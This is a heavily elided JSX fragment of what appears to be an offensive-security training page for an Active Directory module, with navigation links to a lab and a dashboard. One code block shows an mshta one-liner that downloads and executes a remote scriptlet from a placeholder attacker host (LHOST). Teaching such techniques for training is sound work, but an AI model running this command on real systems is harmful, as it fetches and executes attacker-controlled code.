    ...
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        ...
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          ...
          <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'transparent', border: '1px solid #1a2e1e', borderRadius: '3px', color: '#5a7a5a', fontSize: '8px', letterSpacing: '0.15em' }}>LAB →</Link>
        </div>
      </div>
...
mshta javascript:a=(GetObject('script:http://LHOST/payload.sct')).Exec();close();`}</Pre>
      ...
      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #2e0000', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a' }}>← DASHBOARD</Link>
        <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#ff4136', padding: '8px 20px', border: '1px solid rgba(255,65,54,0.4)', borderRadius: '4px', background: 'rgba(255,65,54,0.06)' }}>
          PROCEED TO LAB →
        </Link>
      </div>
    </div>
